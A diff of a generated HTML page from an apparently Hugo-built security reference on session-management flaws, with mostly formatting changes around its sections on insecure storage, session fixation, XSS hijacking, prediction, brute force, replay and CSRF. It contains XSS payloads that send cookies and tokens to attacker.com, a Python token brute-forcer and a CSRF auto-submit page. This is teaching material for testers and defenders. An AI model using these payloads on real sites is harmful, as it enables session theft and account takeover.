 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Referer</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//bank.com/account?session=abc123xyz
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Stored</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">browser</span> <span style="color:#a6e22e">history</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">server</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">logs</span>
-</span></span></code></pre></div><h3 id="6-insecure-session-storage">
-  6. Insecure Session Storage
-  <a class="anchor" href="#6-insecure-session-storage">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Stored</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">browser</span> <span style="color:#a6e22e">history</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">server</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">logs</span></span></span></code></pre></div><h3 id="6-insecure-session-storage">6. Insecure Session Storage<a class="anchor" href="#6-insecure-session-storage">#</a></h3>
 <ul>
 <li>Session tokens stored in localStorage or sessionStorage (accessible via JavaScript)</li>
 <li>Cookies without HttpOnly flag vulnerable to XSS theft</li>
@@ -1435,17 +1400,13 @@ https://github.com/alex-shpak/hugo-book
 <li>Enables token theft through XSS or malicious scripts</li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable - stored in localStorage
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">setItem</span>(<span style="color:#e6db74">&#39;session_token&#39;</span>, <span style="color:#e6db74">&#39;abc123xyz&#39;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable - stored in localStorage
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">setItem</span>(<span style="color:#e6db74">&#39;session_token&#39;</span>, <span style="color:#e6db74">&#39;abc123xyz&#39;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Attacker XSS payload
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://attacker.com/steal?token=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#39;session_token&#39;</span>));
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><h3 id="7-concurrent-session-abuse">
-  7. Concurrent Session Abuse
-  <a class="anchor" href="#7-concurrent-session-abuse">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><h3 id="7-concurrent-session-abuse">7. Concurrent Session Abuse<a class="anchor" href="#7-concurrent-session-abuse">#</a></h3>
 <ul>
 <li>Application allows unlimited simultaneous sessions per user</li>
 <li>No detection or prevention of multiple active sessions</li>
@@ -1453,21 +1414,14 @@ https://github.com/alex-shpak/hugo-book
 <li>Legitimate user unaware their account is being accessed elsewhere</li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Same</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">logged</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">multiple</span> <span style="color:#a6e22e">locations</span> <span style="color:#a6e22e">simultaneously</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Same</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">logged</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">multiple</span> <span style="color:#a6e22e">locations</span> <span style="color:#a6e22e">simultaneously</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Session1</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">New</span> <span style="color:#a6e22e">York</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Desktop</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Session2</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Moscow</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Mobile</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Session3</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">London</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Tablet</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">No</span> <span style="color:#a6e22e">alerts</span>, <span style="color:#a6e22e">no</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">limits</span>, <span style="color:#a6e22e">no</span> <span style="color:#a6e22e">detection</span>
-</span></span></code></pre></div><hr>
-<h2 id="attack-surfaces">
-  Attack Surfaces
-  <a class="anchor" href="#attack-surfaces">#</a>
-</h2>
-<h3 id="cookie-based-sessions">
-  Cookie-Based Sessions
-  <a class="anchor" href="#cookie-based-sessions">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">No</span> <span style="color:#a6e22e">alerts</span>, <span style="color:#a6e22e">no</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">limits</span>, <span style="color:#a6e22e">no</span> <span style="color:#a6e22e">detection</span></span></span></code></pre></div><hr>
+<h2 id="attack-surfaces">Attack Surfaces<a class="anchor" href="#attack-surfaces">#</a></h2>
+<h3 id="cookie-based-sessions">Cookie-Based Sessions<a class="anchor" href="#cookie-based-sessions">#</a></h3>
 <p>Session tokens transmitted via HTTP cookies are the most common implementation.</p>
 <p><strong>Vulnerable patterns:</strong></p>
 <ul>
@@ -1477,10 +1431,7 @@ https://github.com/alex-shpak/hugo-book
 <li>Overly broad cookie scope (Domain/Path attributes)</li>
 <li>Long-lived persistent cookies for sensitive applications</li>
 </ul>
-<h3 id="url-based-session-tokens">
-  URL-Based Session Tokens
-  <a class="anchor" href="#url-based-session-tokens">#</a>
-</h3>
+<h3 id="url-based-session-tokens">URL-Based Session Tokens<a class="anchor" href="#url-based-session-tokens">#</a></h3>
 <p>Session IDs passed as URL parameters instead of cookies.</p>
 <p><strong>Vulnerable patterns:</strong></p>
 <ul>
@@ -1490,10 +1441,7 @@ https://github.com/alex-shpak/hugo-book
 <li>Leaked via Referer header to external sites</li>
 <li>Stored in server access logs and proxy logs</li>
 </ul>
-<h3 id="token-based-authentication-jwt-bearer-tokens">
-  Token-Based Authentication (JWT, Bearer Tokens)
-  <a class="anchor" href="#token-based-authentication-jwt-bearer-tokens">#</a>
-</h3>
+<h3 id="token-based-authentication-jwt-bearer-tokens">Token-Based Authentication (JWT, Bearer Tokens)<a class="anchor" href="#token-based-authentication-jwt-bearer-tokens">#</a></h3>
 <p>APIs using JSON Web Tokens or bearer tokens for session management.</p>
 <p><strong>Vulnerable patterns:</strong></p>
 <ul>
@@ -1503,10 +1451,7 @@ https://github.com/alex-shpak/hugo-book
 <li>Missing token revocation mechanism</li>
 <li>Tokens transmitted over unencrypted connections</li>
 </ul>
-<h3 id="single-sign-on-sso-sessions">
-  Single Sign-On (SSO) Sessions
-  <a class="anchor" href="#single-sign-on-sso-sessions">#</a>
-</h3>
+<h3 id="single-sign-on-sso-sessions">Single Sign-On (SSO) Sessions<a class="anchor" href="#single-sign-on-sso-sessions">#</a></h3>
 <p>Applications using OAuth, SAML, or OpenID Connect for authentication.</p>
 <p><strong>Vulnerable patterns:</strong></p>
 <ul>
@@ -1516,10 +1461,7 @@ https://github.com/alex-shpak/hugo-book
 <li>Insufficient validation of SAML assertions</li>
 <li>Session fixation in SSO implementation</li>
 </ul>
-<h3 id="session-state-in-hidden-fields">
-  Session State in Hidden Fields
-  <a class="anchor" href="#session-state-in-hidden-fields">#</a>
-</h3>
+<h3 id="session-state-in-hidden-fields">Session State in Hidden Fields<a class="anchor" href="#session-state-in-hidden-fields">#</a></h3>
 <p>Legacy applications storing session state in HTML hidden fields.</p>
 <p><strong>Vulnerable patterns:</strong></p>
 <ul>
@@ -1529,10 +1471,7 @@ https://github.com/alex-shpak/hugo-book
 <li>Sensitive data exposed in HTML source</li>
 <li>No server-side validation of session state</li>
 </ul>
-<h3 id="websocket-sessions">
-  WebSocket Sessions
-  <a class="anchor" href="#websocket-sessions">#</a>
-</h3>
+<h3 id="websocket-sessions">WebSocket Sessions<a class="anchor" href="#websocket-sessions">#</a></h3>
 <p>Real-time applications using WebSocket connections with session management.</p>
 <p><strong>Vulnerable patterns:</strong></p>
 <ul>
@@ -1543,22 +1482,15 @@ https://github.com/alex-shpak/hugo-book
 <li>Session not invalidated when WebSocket closes</li>
 </ul>
 <hr>
-<h2 id="exploitation-and-attack-techniques">
-  Exploitation and Attack Techniques
-  <a class="anchor" href="#exploitation-and-attack-techniques">#</a>
-</h2>
-<h3 id="session-fixation-attack">
-  Session Fixation Attack
-  <a class="anchor" href="#session-fixation-attack">#</a>
-</h3>
+<h2 id="exploitation-and-attack-techniques">Exploitation and Attack Techniques<a class="anchor" href="#exploitation-and-attack-techniques">#</a></h2>
+<h3 id="session-fixation-attack">Session Fixation Attack<a class="anchor" href="#session-fixation-attack">#</a></h3>
 <p><strong>Methodology:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">obtains</span> <span style="color:#a6e22e">valid</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">ID</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">target</span> <span style="color:#a6e22e">application</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">obtains</span> <span style="color:#a6e22e">valid</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">ID</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">target</span> <span style="color:#a6e22e">application</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Forces</span> <span style="color:#a6e22e">victim</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">authenticate</span> <span style="color:#a6e22e">using</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">ID</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Victim</span> <span style="color:#a6e22e">logs</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">successfully</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Application</span> <span style="color:#a6e22e">fails</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">regenerate</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">ID</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">uses</span> <span style="color:#a6e22e">original</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">ID</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">victim</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">account</span>
-</span></span></code></pre></div><p><strong>Exploitation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">Method</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">URL</span> <span style="color:#a6e22e">parameter</span> <span style="color:#a6e22e">injection</span> <span style="color:#f92672">--&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">uses</span> <span style="color:#a6e22e">original</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">ID</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">victim</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">account</span></span></span></code></pre></div><p><strong>Exploitation:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">Method</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">URL</span> <span style="color:#a6e22e">parameter</span> <span style="color:#a6e22e">injection</span> <span style="color:#f92672">--&gt;</span>
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://target.com/login?PHPSESSID=attacker_session_123&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Click</span> <span style="color:#a6e22e">here</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">login</span>
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">a</span>&gt;
@@ -1570,32 +1502,24 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">Method</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Meta</span> <span style="color:#a6e22e">tag</span> <span style="color:#a6e22e">injection</span> <span style="color:#f92672">--&gt;</span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http</span><span style="color:#960050;background-color:#1e0010">-</span><span style="color:#a6e22e">equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Set-Cookie&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;session_id=attacker_session_123&#34;</span>&gt;
-</span></span></code></pre></div><h3 id="session-hijacking-via-xss">
-  Session Hijacking via XSS
-  <a class="anchor" href="#session-hijacking-via-xss">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http</span><span style="color:#960050;background-color:#1e0010">-</span><span style="color:#a6e22e">equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Set-Cookie&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;session_id=attacker_session_123&#34;</span>&gt;</span></span></code></pre></div><h3 id="session-hijacking-via-xss">Session Hijacking via XSS<a class="anchor" href="#session-hijacking-via-xss">#</a></h3>
 <p><strong>Exploitation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Steal session cookie via XSS
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;<span style="color:#f92672">script</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Steal session cookie via XSS
+</span></span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://attacker.com/steal?cookie=&#39;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>);
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Steal session from localStorage
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://attacker.com/steal?token=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#39;auth_token&#39;</span>));
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Exfiltrate session via image request
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://attacker.com/log?c=&#39;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><h3 id="session-prediction-attack">
-  Session Prediction Attack
-  <a class="anchor" href="#session-prediction-attack">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><h3 id="session-prediction-attack">Session Prediction Attack<a class="anchor" href="#session-prediction-attack">#</a></h3>
 <p><strong>Methodology:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">time</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Collect</span> <span style="color:#a6e22e">multiple</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">IDs</span>
@@ -1612,13 +1536,9 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Look</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">sequential</span>, <span style="color:#a6e22e">timestamp</span><span style="color:#f92672">-</span><span style="color:#a6e22e">based</span>, <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">predictable</span> <span style="color:#a6e22e">patterns</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Predict</span> <span style="color:#a6e22e">next</span> <span style="color:#a6e22e">valid</span> <span style="color:#a6e22e">session</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Try</span> <span style="color:#a6e22e">predicted</span> <span style="color:#a6e22e">sessions</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">unauthorized</span> <span style="color:#a6e22e">access</span>
-</span></span></code></pre></div><h3 id="brute-force-session-tokens">
-  Brute Force Session Tokens
-  <a class="anchor" href="#brute-force-session-tokens">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Try</span> <span style="color:#a6e22e">predicted</span> <span style="color:#a6e22e">sessions</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">unauthorized</span> <span style="color:#a6e22e">access</span></span></span></code></pre></div><h3 id="brute-force-session-tokens">Brute Force Session Tokens<a class="anchor" href="#brute-force-session-tokens">#</a></h3>
 <p><strong>Exploitation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">string</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">itertools</span>
 </span></span><span style="display:flex;"><span>
@@ -1633,28 +1553,20 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">requests</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">url</span>, <span style="color:#a6e22e">cookies</span><span style="color:#f92672">=</span><span style="color:#a6e22e">cookies</span>)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Welcome&#34;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span><span style="color:#f92672">:</span>  <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Successful</span> <span style="color:#a6e22e">session</span>
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#34;Valid session found: {session_token}&#34;</span>)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">session_token</span>
-</span></span></code></pre></div><h3 id="session-replay-attack">
-  Session Replay Attack
-  <a class="anchor" href="#session-replay-attack">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">session_token</span></span></span></code></pre></div><h3 id="session-replay-attack">Session Replay Attack<a class="anchor" href="#session-replay-attack">#</a></h3>
 <p><strong>Exploitation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Capture</span> <span style="color:#a6e22e">valid</span> <span style="color:#a6e22e">session</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Capture</span> <span style="color:#a6e22e">valid</span> <span style="color:#a6e22e">session</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/dashboard \
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=abc123xyz&#34;</span>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=abc123xyz&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Wait</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">logout</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Replay</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">same</span> <span style="color:#a6e22e">session</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/dashboard \
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=abc123xyz&#34;</span>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=abc123xyz&#34;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">If</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">properly</span> <span style="color:#a6e22e">invalidated</span>, <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">granted</span>
-</span></span></code></pre></div><h3 id="csrf-attack">
-  CSRF Attack
-  <a class="anchor" href="#csrf-attack">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">If</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">properly</span> <span style="color:#a6e22e">invalidated</span>, <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">granted</span></span></span></code></pre></div><h3 id="csrf-attack">CSRF Attack<a class="anchor" href="#csrf-attack">#</a></h3>
 <p><strong>Exploitation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">Malicious</span> <span style="color:#a6e22e">page</span> <span style="color:#a6e22e">hosted</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">com</span> <span style="color:#f92672">--&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">Malicious</span> <span style="color:#a6e22e">page</span> <span style="color:#a6e22e">hosted</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">com</span> <span style="color:#f92672">--&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">DOCTYPE</span> <span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
@@ -1670,13 +1582,9 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;csrf&#39;</span>).<span style="color:#a6e22e">submit</span>();
